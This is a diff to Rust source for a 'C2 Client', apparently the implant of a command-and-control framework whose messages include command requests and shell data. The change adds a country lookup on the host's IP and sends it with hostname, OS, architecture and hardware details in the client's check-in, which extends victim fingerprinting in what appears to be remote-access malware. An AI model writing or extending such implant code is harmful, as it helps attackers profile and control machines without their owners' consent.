@@ -10,7 +10,7 @@ use common::config::ClientConfig;
 use common::error::{C2Error, C2Result};
 use common::{
     message::{ClientInfo, CommandRequest, CommandResponse, Message, MessageType, ShellData},
-    sysinfo::{get_hardware_info, get_hostname, get_local_ip},
+    sysinfo::{get_country, get_hardware_info, get_hostname, get_local_ip},
 };
 
 /// C2 Client
@@ -21,7 +21,7 @@ pub struct C2Client {
 }
 
 impl C2Client {
-    pub fn new(config: ClientConfig) -> C2Result<Self> {
+    pub async fn new(config: ClientConfig) -> C2Result<Self> { // Made async
         let client_id = config
             .client_id
             .clone()
@@ -32,6 +32,18 @@ impl C2Client {
         let hardware_info: serde_json::Value = serde_json::from_str(&hardware_info_str)
             .map_err(|e| C2Error::Other(format!("Failed to parse hardware info: {e}")))?;
 
+        let ip = get_local_ip()
+            .unwrap_or_else(|_| "127.0.0.1".parse().unwrap())
+            .to_string();
+
+        // Move the blocking get_country call to a blocking task
+        let country_info = tokio::task::spawn_blocking({
+            let ip_clone = ip.clone(); // Clone ip for the closure
+            move || get_country(ip_clone).ok()
+        })
+        .await
+        .map_err(|e| C2Error::Other(format!("Failed to spawn blocking task for country info: {e}")))?;
+
         let client_info = ClientInfo {
             id: client_id,
             hostname: get_hostname().unwrap_or_else(|_| "unknown".to_string()),
@@ -40,9 +52,8 @@ impl C2Client {
                 .unwrap_or_else(|_| "unknown".to_string()),
             os: std::env::consts::OS.to_string(),
             arch: std::env::consts::ARCH.to_string(),
-            ip: get_local_ip()
-                .unwrap_or_else(|_| "127.0.0.1".parse().unwrap())
-                .to_string(),
+            ip,
+            country_info,
             cpu_brand: hardware_info
                 .get("cpu_brand")
                 .and_then(|v| v.as_str())
@@ -280,7 +291,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut client = C2Client::new(ClientConfig {
         server_url,
         ..config
-    })?;
+    }).await?; // Await the async new function
     client.run().await?;
     Ok(())
 }
